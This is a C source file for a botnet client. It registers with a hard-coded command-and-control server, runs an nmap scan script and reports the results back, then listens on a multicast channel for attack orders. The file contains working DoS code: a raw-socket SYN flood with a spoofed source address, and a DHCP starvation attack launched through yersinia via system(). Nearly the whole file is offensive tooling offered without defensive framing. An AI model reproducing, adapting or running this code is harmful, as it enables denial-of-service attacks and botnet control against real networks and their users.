#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>	//Provides declarations for tcp header
#include<netinet/ip.h>	//Provides declarations for ip header
#include <linux/if_ether.h>


#define Buffer_size 512

//----FUNCTIONS----
int temp;
void ReadNMap(char* buffer);
void* NMap(void *arg);
void* TCPSocket(void *arg);
void* MultiCastSocket(void *arg);
void* SYNatk(void *arg);
void* DHCPatk(void *arg);
void ReadMessage(char* buffer);
void WriteMessage(char* buffer,int type);
void WriteHELLO(char* buffer);
int ReadACK(char* Localbuffer,short option);
void WriteREPORT(char* Localbuffer,short option);
void WriteKEEPALIVE(char* Localbuffer);
int ReadRequest(char* Localbuffer);
void CheckMe(int resulte,char const* message);
void* DHCPatk(void *arg);
//-----STRUCTS------
struct MessageHello{
    short type; //0
    char hello[6];
};

struct MessageKeepAlive{
    short type;  //1
    short id;
};

struct MessageAck{
    short type;  //2
    short option;   //0-just ack, 1-IP, 2-ID 3- RECOVERY
    char payload[16];  //ip or ID
};

struct MessageRequest{
    short type;  //3
    short option;   //0-NMAP,1-attack,2-exit
    char target[16];  //ip
    short attackType; //1 SYN,2 UDP, 3 DHCP
    int time;
};

struct MessageReport{
    short type;   //4
    short option;   //0-finish attack, 1-keepAlive error, 2-Unread message error
    short id;
    char* data;
};

//-----TCP ATK------
struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};
unsigned short csum(unsigned short *ptr,int nbytes);
//----FLAGS----
int exitFlag=0; //will be raised on exit command,error,end of program.
int mcKAFlag = 0; //multicast KEEPALIVE - WILL BE RAISED ON KEEPALIVE RECIVE AND WILL BE CHEKED EVERY 30 SEC
int tcpKAFLAG=1;// same as MCKAFlag
int atkFlag=0;
//----BUFFERS--
char nmapbuffer[512];
char MCbuffer[Buffer_size];

//---AUTH VARS-----
char *script = "./rmap.sh &";
char hello[6]="Hel1O";
const char *SERVER_IP ="192.3.1.1";
const short SERVER_PORT=4200;
//---THREADS---
pthread_t tcp_t;
pthread_t multicast_t;
pthread_t   nmap_t;
pthread_t syn_t;
//etc
char multicast_ip[16];
short id;
int atk;
int reuse = 1;
int pip[2];
int ATKpip[2];
int errnum=0;
char pipevar;
char piperead;
short req;
struct timeval timeoutMC;
int p;

//-------------------MAIN------------------
int main( ){
//-----init pipe-----
    if(pipe(pip)<0){
        perror("error in pipe");
        exit(-1);
    }
    if(pipe(ATKpip)<0){
        perror("error in pipe");
        exit(-1);
    }
//------------------ TCP THREAD INIT --------------
    if (pthread_create(&tcp_t,NULL,TCPSocket,NULL) !=0) {
        perror("TCP INIT FAILD\n");
        exit(-1);
    }
//----------EXIT ALL THREADS------------------

    pthread_join(tcp_t,NULL);
    printf("join done");
    return 0;
}

//------------------ TCP FUNC --------------
// STAGE 1 - OPEN
// 1. START TCP CONNECTION
void* TCPSocket(void *arg) {
    struct timeval timeout;

    timeout.tv_usec = 0;
    int clientSocket, byteSend, numOfRecive = 0;
    char buffer[Buffer_size];
    fd_set fdset, rdset;
    FD_ZERO(&fdset);
    FD_ZERO(&rdset);
    struct sockaddr_in serverAddr;
    memset(buffer, 0, sizeof(buffer));
    clientSocket = socket(PF_INET, SOCK_STREAM, 0);//MUST BE SEPERATE
    if (clientSocket < 0) {                                              //LINES UNELESS YOU WANT ERROR
        perror("socket failed");
        exit(-1);
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT); //port
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);  //ip
    printf("socket open\n");
    temp =connect(clientSocket, (struct sockaddr *) &(serverAddr), sizeof(struct sockaddr_in)) ;
    if (temp < 0) {
        perror("connect failed");
        close(clientSocket);
        exit(EXIT_FAILURE);
    }
    printf("connection succeeded!\n");
    //TCP CONNECTION SUCCESSFUL - SEND HEELO MESSAGE
    WriteHELLO(buffer);
    sleep(1);

    if ((byteSend = send(clientSocket, buffer, Buffer_size, 0)) < 0) {
        perror("send failed");
        close(clientSocket);
        exit(EXIT_FAILURE);
    }
    sleep(1);
    FD_SET(clientSocket, &fdset);
    FD_SET(fileno(stdin), &fdset);
    //WAIT ACK WITH ID
    rdset = fdset;
    timeout.tv_sec = 30;
    errnum=select(FD_SETSIZE, &rdset, NULL, NULL, &timeout); //30 sec timeout
    CheckMe(errnum,"error in send multicast\n");
    memset(buffer, 0, Buffer_size);
    if (errnum==0){   //timeout
        exitFlag =1;
        printf("ACK ID TIME OUT\n");
        tcpKAFLAG=0;
        pthread_exit(NULL);
    } else if (FD_ISSET(clientSocket,&rdset)) {//multicast signal
        memset(buffer, 0, Buffer_size);
        if ((numOfRecive = recv(clientSocket, buffer, Buffer_size, 0)) < 0) {
            perror("ack with ip failed");
            close(clientSocket);
            exit(EXIT_FAILURE);
        }
    }
    if (ReadACK(buffer, 2) < 0) {
        printf("wrong msg - didnt receive ack with ID"); //what we do here
        exit(-1);
    } else {
        //got id;
        //------------------------------------INIT NMAP---------------------
        temp =pthread_create(&nmap_t,NULL,NMap,NULL);
        if (temp!=0) {
            perror("NMAP INIT FAILD\n");
            exit(-1);
        }
        pthread_join(nmap_t,NULL);

        //--------------SEND NMAP--------------------
        WriteREPORT(buffer,3);
        if ((byteSend = send(clientSocket, buffer, Buffer_size, 0)) < 0) {
            perror("send failed");
            close(clientSocket);
            exit(EXIT_FAILURE);
        }
        printf("NMAP sent - wait multicast ip \n");
    }
    timeout.tv_sec = 30;
    errnum=select(FD_SETSIZE, &rdset, NULL, NULL, &timeout); //30 sec timeout
    CheckMe(errnum,"error in send multicast\n");
    memset(buffer, 0, Buffer_size);
    if (errnum==0){   //timeout
        exitFlag =1;
        printf("ACK IP TIME OUT\n");
        tcpKAFLAG=0;
        //exit
    } else if (FD_ISSET(clientSocket,&rdset)){//multicast signal
        memset(buffer,0,Buffer_size);
        if ((numOfRecive = recv(clientSocket, buffer, Buffer_size, 0)) <0) {
            perror("ack with ip failed");
            close(clientSocket);
            exit(EXIT_FAILURE);

        }
    }
    if (ReadACK(buffer, 1)< 0) {
        printf("wrong msg - didnt receive ack with MULTICAST"); //what we do here
        pthread_exit(NULL);
    }else{
        //-------ACK WITH IP RECIVED-----------
        //------------------------------------INIT MULTICAST---------------------
        temp =pthread_create(&multicast_t,NULL,MultiCastSocket,NULL);
        //got multicast ip - open new  thread to handle it
        printf("creating MULTICAST thread \n");
        if (temp!=0) {
            perror("MULTICAST INIT FAILD\n");
            exit(-1);
        }

        while(!mcKAFlag);
        WriteKEEPALIVE(buffer);
        if ((byteSend = send(clientSocket, buffer, Buffer_size, 0)) < 0) {
            perror("send failed");
            close(clientSocket);
            exit(EXIT_FAILURE);
        }
        printf("KEEPALIVE SENT OVER TCP\n");
    }

    //-----ESTABLISHED---------
    //send KEEPALIVE AND REPORT over tcp
    //LISTEN FOR KEEPALIVES AND REUESTS OVER MULTICAST
    FD_ZERO(&fdset);
    //FD_SET(multiSocket,&current_socket_multi);
    FD_SET(pip[0],&fdset);
    FD_SET(clientSocket,&fdset);
    timeout.tv_sec=30;
    while(tcpKAFLAG&&!(exitFlag)){
        timeout.tv_sec=30;
        rdset =fdset;

        errnum=select(FD_SETSIZE, &rdset, NULL, NULL, &timeout);
        CheckMe(errnum,"error in select\n");
        if (errnum==0){   //timeout
            exitFlag =1;
            printf("TCP KEEPALIVE TIME OUT\n");
            tcpKAFLAG=0;
        } else if (FD_ISSET(pip[0],&rdset)){   //multicast signal
            sleep(1);
           p= read(pip[0],&piperead,1);
            if(p>0){
            //printf("PIPE INTERUPT \n");
            if(MCbuffer[0]==1&&MCbuffer[2]==0) { //SERVER KEEP ALIVE
                printf("MULTICAST KEEP ALIVE FROM SERVER \n");
                WriteKEEPALIVE(buffer);
                if ((byteSend = send(clientSocket, buffer, Buffer_size, 0)) < 0) {
                    perror("send failed");
                    close(clientSocket);
                    exit(EXIT_FAILURE);
                }
                printf("KEEPALIVE SENT OVER TCP\n");
                sleep(1);
                timeout.tv_sec = 30;
            }else if (MCbuffer[0]==3){ //REQUEST
                req = ReadRequest(MCbuffer); //returns REPORT value  0-finish attack, 1-keepAlive error, 2-Unread message error
                WriteREPORT(buffer,req);
                sleep(1);
                if ((byteSend = send(clientSocket, buffer, Buffer_size, 0)) < 0) {
                    perror("send failed");
                    close(clientSocket);
                    exit(EXIT_FAILURE);
                }
                timeout.tv_sec = 30;
            }else{
                if(MCbuffer[0] !=0){
                printf("MULTICAST MSG NOT EXPECTED : %s\n",MCbuffer);
                exit(-1);
                }
            
            }
        }else if (FD_ISSET(clientSocket,&rdset)){//multicast signal
            memset(buffer,0,Buffer_size);
            if ((numOfRecive = recv(clientSocket, buffer, Buffer_size, 0)) <0) {
                perror("TCP GENERAL FAIL");
                close(clientSocket);
                exit(EXIT_FAILURE);
            }
            printf("%s\n",buffer);
            ReadRequest(buffer);
        }
        // timeout.tv_sec = 30;
}
    }
    pthread_join(multicast_t,NULL);
    pthread_exit(NULL);
}

void WriteHELLO(char* Localbuffer){
    struct MessageHello HELLO;
    int offset;
    memset(Localbuffer,0,sizeof(&Localbuffer));
    memset(&HELLO,0,sizeof(HELLO));
    HELLO.type=0;
    memcpy(Localbuffer,&HELLO.type,sizeof(HELLO.type));
    offset=sizeof(HELLO.type);
    memcpy(Localbuffer+offset,hello,sizeof(HELLO.hello));
}
int ReadACK(char* Localbuffer,short option){
    // this function auto assagins ID
    struct MessageAck ACK;
    int offset;
    if(Localbuffer[0]!=2){
        printf("not an ACK\n");
        memset(Localbuffer, 0, Buffer_size);
        return(-1);
    }else{
        //it is an ACK
        memset(&ACK,0,sizeof(ACK));
        offset=sizeof(ACK.type);
        memcpy(&ACK.option,Localbuffer+offset,sizeof(ACK.option));
        offset+=sizeof(ACK.option);
        memcpy(&ACK.payload,Localbuffer+offset,sizeof(ACK.payload));
        if (ACK.option!=option) {
            printf("ACK wrong ack type\n");
            return (-1);
        }
        switch (ACK.option) {
            case 0:
                printf("normal ACK");
                return 0;
                break;
            case 1:
                //printf("ACK WITH GROUP IP %s\n",ACK.payload);
                strcpy(multicast_ip,ACK.payload);
                printf("ACK WITH GROUP-IP %s\n",multicast_ip);
                return 0;
                break;
            case 2:
                printf("ACK WITH  ID %s\n",ACK.payload);
                id = (short)atoi(ACK.payload);
                return 0;// test required - myabe can be cahnged to return id
                break;
        }

    }
    return(-1);
}
void ReadNMap(char* Localbuffer){
    int lines;
    int offset;
    memset(Localbuffer,0,sizeof(&Localbuffer));
    FILE *f = fopen("lines.txt", "rb");
    fscanf (f, "%d", &lines);
    fclose(f);
    memcpy(Localbuffer,&lines,sizeof(lines));
    offset=sizeof(lines);
    f = fopen("nmap.txt", "rb");
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
    fread(Localbuffer+offset, fsize, 1, f);
    fclose(f);
    Localbuffer[fsize+offset] = '\0';
    printf("NMap loaded to buffer: data is %s\n",Localbuffer);
}
void WriteREPORT(char* Localbuffer,short option) {
    struct MessageReport REPORT;
    memset(&REPORT, 0, sizeof(REPORT));
    REPORT.option=option;
    REPORT.id=id;
    REPORT.type=4;
    int offset;
    memset(Localbuffer,0,Buffer_size);
    memcpy(Localbuffer,&REPORT.type,  sizeof(REPORT.type));
    offset = sizeof(REPORT.type);
    memcpy(Localbuffer + offset,&REPORT.option,  sizeof(REPORT.option));
    offset += sizeof(REPORT.option);
    memcpy( Localbuffer + offset, &REPORT.id,sizeof(REPORT.id));
    offset += sizeof(REPORT.id);
    switch (option) {
        case 0:
            printf("BOT #%hd report FINISH ATTACK\n", REPORT.id);

            break;
        case 1:
            printf("BOT #%hd report ERROR KEEPALIVE\n", REPORT.id);
            break;
        case 2:
            printf("BOT #%hd report ERROR UNDEFINE MESSAGE\n", REPORT.id);
            break;
        case 3:
            printf("BOT #%hd report NMAP \n", REPORT.id);
            memcpy(Localbuffer+offset,&nmapbuffer,sizeof(nmapbuffer));
            break;

            break;

    }
}
void* NMap(void *arg){
    system(script);
    sleep(45); //APROX TIME FOR NMAP
    printf("NMap done\n");
    ReadNMap(nmapbuffer);
    pthread_exit(NULL);
}

void*  MultiCastSocket(void *arg) {
    struct timeval timeout;
    timeout.tv_sec = 30;
    timeout.tv_usec = 0;
    fd_set fdset, rdset;
    FD_ZERO(&fdset);
    FD_ZERO(&rdset);
    struct ip_mreq multi;
    socklen_t addr_size;
    struct sockaddr_in sockAddr;
    int multi_clientSocket,  numOfRecive1 = 0;
    memset(MCbuffer, 0, sizeof(MCbuffer));
    multi_clientSocket = socket(AF_INET, SOCK_DGRAM, 0);//MUST BE SEPERATE
    if (multi_clientSocket < 0) {                                             
        perror("socket failed");
        exit(-1);
    }
    temp =setsockopt(multi_clientSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse, sizeof(reuse));
    if(temp < 0)
    {
        perror("Setting SO_REUSEADDR error");
        close(multi_clientSocket);
        exit(-1);
    }
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(SERVER_PORT+1); //port
    sockAddr.sin_addr.s_addr = INADDR_ANY;
    if (bind(multi_clientSocket, (struct sockaddr *) &sockAddr, sizeof(sockAddr))) {
        perror("Binding datagram socket error");
        close(multi_clientSocket);
        exit(-1);
    }

    multi.imr_multiaddr.s_addr = inet_addr(multicast_ip);
    multi.imr_interface.s_addr = htonl(INADDR_ANY);
    setsockopt(multi_clientSocket, IPPROTO_IP, IP_ADD_MEMBERSHIP, &multi, sizeof(multi));

    printf("waiting MULTICAST KEEPALIVE....\n");
    memset(MCbuffer,0,sizeof(MCbuffer));
    numOfRecive1=recvfrom(multi_clientSocket, MCbuffer, Buffer_size, 0, (struct sockaddr *) &sockAddr, &addr_size);
    if (numOfRecive1 < 0) {
        perror("Binding datagram socket error");
        close(multi_clientSocket);
        exit(-1);
    }
    if((MCbuffer[0]==1)&&(MCbuffer[2]==0)){
        printf("MULTICAST KEEP ALIVE FROM SERVER - ESTABLISHED\n");
        mcKAFlag=1;
    }
    //-----------------------------ESTABLISHED------------------
    FD_ZERO(&fdset);
    //FD_SET(multiSocket,&current_socket_multi);
    //FD_SET(pip[0],&fdset);
    FD_SET(multi_clientSocket,&fdset);
    timeout.tv_sec=30;
    while(mcKAFlag){
        timeoutMC.tv_usec=0;
        if(!atkFlag){
            timeout.tv_sec=30;
        }
        rdset =fdset;
        errnum=select(FD_SETSIZE, &rdset, NULL, NULL, &timeout);
        CheckMe(errnum,"error in select\n");
        if (errnum==0){   //timeout
            exitFlag =1;
            mcKAFlag=0;
            printf("multicast KEEPALIVE TIME OUT\n");
            tcpKAFLAG=0;
        } else if (FD_ISSET(multi_clientSocket,&rdset)){   //tcp signal
            //ADD FUNC HERE - CHECK IF TCP MSG IS EXIT/RECOVRY AND ACT ACCORDINNLY
            memset(MCbuffer,0,sizeof(MCbuffer));
            recvfrom(multi_clientSocket, MCbuffer, Buffer_size, 0, (struct sockaddr *) &sockAddr, &addr_size);
            pipevar='1';
            write(pip[1],&pipevar,1);  //sign 0 for exit
            write(ATKpip[1],&pipevar,1);  //sign 0 for exit
            sleep(2); //so  thread number 2 will update the timer
            timeout.tv_sec = timeoutMC.tv_sec;
        }
    }
    pthread_exit(NULL);
}

void CheckMe(int resulte,char const* message) {
    if (resulte < 0) {
        perror(message);
        exit(-1);
    }
}

//short type;  //3
//short option;   //0-NMAP,1-attack,2-exit
//char target[16];  //ip
//short attackType; //1 SYN,2 UDP, 3 DHCP
//int time;
// -1 = error, 0 = other bot, 1 = success
int ReadRequest(char* Localbuffer) { //TCP THREADS READS ATKS , MULTICAST ONLY KEEP ALIVE AND EXIT
    struct MessageRequest REQUEST;
    struct timeval timeout1;
    timeout1.tv_sec = 45; //defualt - for nmap
    timeout1.tv_usec = 0;
    fd_set fdset1, rdset1;
    int offset;
    memset(&REQUEST, 0, sizeof(REQUEST));
    memcpy(&REQUEST.type, Localbuffer, sizeof(REQUEST.type));
    offset = sizeof(REQUEST.type);
    memcpy(&REQUEST.option, Localbuffer + offset, sizeof(REQUEST.option));
    offset += sizeof(REQUEST.option);
    memcpy(&REQUEST.target, Localbuffer + offset, sizeof(REQUEST.target));
    offset += sizeof(REQUEST.target);
    memcpy(&REQUEST.attackType, Localbuffer + offset, sizeof(REQUEST.attackType));
    offset += sizeof(REQUEST.attackType);
    memcpy(&REQUEST.time, Localbuffer + offset, sizeof(REQUEST.time));
    memset(Localbuffer, 0, Buffer_size);
    if ((REQUEST.type) != 3) {
        printf("not a request\n");
        tcpKAFLAG = 0;
        mcKAFlag = 0;
        exitFlag = 1;
        pthread_exit(NULL);

    }
    switch (REQUEST.option) {
        case 0:
            printf("NMAP NOT AVAILABLE\n");
            break;
        case 1:
            timeout1.tv_sec = REQUEST.time;
            timeoutMC.tv_sec = REQUEST.time;
            FD_ZERO(&fdset1);
            FD_ZERO(&rdset1);
            FD_SET(ATKpip[0], &fdset1);
            rdset1 = fdset1;

            switch (REQUEST.attackType) {
                case 1:
                    atkFlag = 1;
                    printf("SYN ATTACK on %s for %d sec\n", REQUEST.target, REQUEST.time);
                    temp = pthread_create(&syn_t, NULL, SYNatk, (void *) &REQUEST.target);
                    printf("atk in proggress..\n");
                    while (atkFlag) {
                        atk = select(FD_SETSIZE, &rdset1, NULL, NULL, &timeout1);
                        if (atk == 0) {   //timeout
                            //flags
                            printf("ATK FINISHED SUCCSEFULY\n");
                            atkFlag = 0;
                            memset(MCbuffer, 0, Buffer_size);
                            tcpKAFLAG = 1;
                            sleep(1);

                            return 0;
                        } else if (FD_ISSET(ATKpip[0], &rdset1)) {   //multicast signal
                            read(ATKpip[0], &piperead, 1);
                            if (MCbuffer[0] == 1 && MCbuffer[2] == 0) {
                                printf("server keepalive -ignore and contuie atk\n");
                                memset(MCbuffer, 0, Buffer_size);
                            } else if (MCbuffer[0] == 3 && MCbuffer[2] == 2) {   //multicast exit signal
                                printf("EXIT COMMAND\n");
                                exitFlag = 1;
                                tcpKAFLAG = 0;
                                pthread_exit(NULL);
                            } else {
                                printf("UNKNOW MSG \n");
                                memset(MCbuffer, 0, Buffer_size);
                            }
                        }
                    }

                    break;
                case 2:
                    printf("UDP ATTACK on %s for %d sec\n", REQUEST.target, REQUEST.time);
                    break;
                case 3:
                    printf("DHCP ATTACK on %s for %d sec\n", REQUEST.target, REQUEST.time);
                    atkFlag = 1;
                    temp = pthread_create(&syn_t, NULL, DHCPatk, (void *) &REQUEST.target);
                    printf("thread succeeded!\n");
                    while (atkFlag) {
                        atk = select(FD_SETSIZE, &rdset1, NULL, NULL, &timeout1);
                        if (atk == 0) {   //timeout
                            //flags
                            printf("ATK FINISHED SUCCSEFULY\n");
                            atkFlag = 0;
                            tcpKAFLAG = 1;
                            return 0;
                        } else if (FD_ISSET(ATKpip[0], &rdset1)) {   //multicast signal
                            read(ATKpip[0], &piperead, 1);
                            if (MCbuffer[0] == 1 && MCbuffer[2] == 0) {
                                printf("server keepalive -ignore and contuie atk\n");
                                memset(MCbuffer, 0, Buffer_size);
                            }else if(MCbuffer[0] == 3 && MCbuffer[2] == 2) {   //multicast exit signal
                                printf("EXIT COMMAND\n");
                                exitFlag = 1;
                                tcpKAFLAG = 0;
                                pthread_exit(NULL);
                            } else {
                                printf("UNKNOW MSG  - ignore\n");
                                memset(MCbuffer, 0, Buffer_size);
                            }
                        }
                    }

                    break;
                default:
                    printf("UKNOWN ATTACK\n");
                    return(-1);
            }
            break;
        case 2:

            printf("EXIT COMMAND - case 2\n");
            exitFlag = 1;
            tcpKAFLAG = 1;
            pthread_exit(NULL);
            break;
    }
    return(-1);
}



void WriteKEEPALIVE(char* Localbuffer){
    struct MessageKeepAlive KEEPALIVE;
    int offset=0;
    memset(Localbuffer,0,Buffer_size);
    memset(&KEEPALIVE,0,sizeof(KEEPALIVE));
    KEEPALIVE.type=1;
    KEEPALIVE.id=id;
    memcpy(Localbuffer,&KEEPALIVE.type,sizeof(KEEPALIVE.type));
    offset=sizeof(KEEPALIVE.type);
    memcpy(Localbuffer+offset,(&KEEPALIVE.id),sizeof(KEEPALIVE.id));
}

void* SYNatk(void *arg){
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    char IP[16] ;
    memset(&IP,0,16);
    strcpy(IP,arg);
    printf("%s\n",IP);
    strcpy(source_ip , "69.42.13.37");

    sin.sin_family = AF_INET;
    sin.sin_port = htons(4200);
    sin.sin_addr.s_addr = inet_addr (IP);

    memset (datagram, 0, 4096);	/* zero out the buffer */

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);	//Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;		//Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons (7070);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;		/* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840);	/* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;

    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }

    //Uncommend the loop if you want to flood :)
    while (atkFlag)
    {
        //Send the packet
        if (sendto (s,		/* our socket */
                    datagram,	/* the buffer containing headers and data */
                    iph->tot_len,	/* total length of our datagram */
                    0,		/* routing flags, normally always 0 */
                    (struct sockaddr *) &sin,	/* socket addr, just like in */
                    sizeof (sin)) < 0)		/* a normal send() */
        {
            printf ("error\n");
        }
            //Data send successfully
        else
        {
            //  printf ("Packet Send \n");
        }
    }

    pthread_exit(NULL);;
}

void* DHCPatk(void *arg){
    char buf[60];
    memset(buf,0,60);
    int i = *(int*)arg;
    sprintf(buf,  "timeout %d yersinia dhcp -attack 1",i); // puts string into buffer
    system(buf);
    while(atkFlag);
    pthread_exit(NULL);
}

unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}







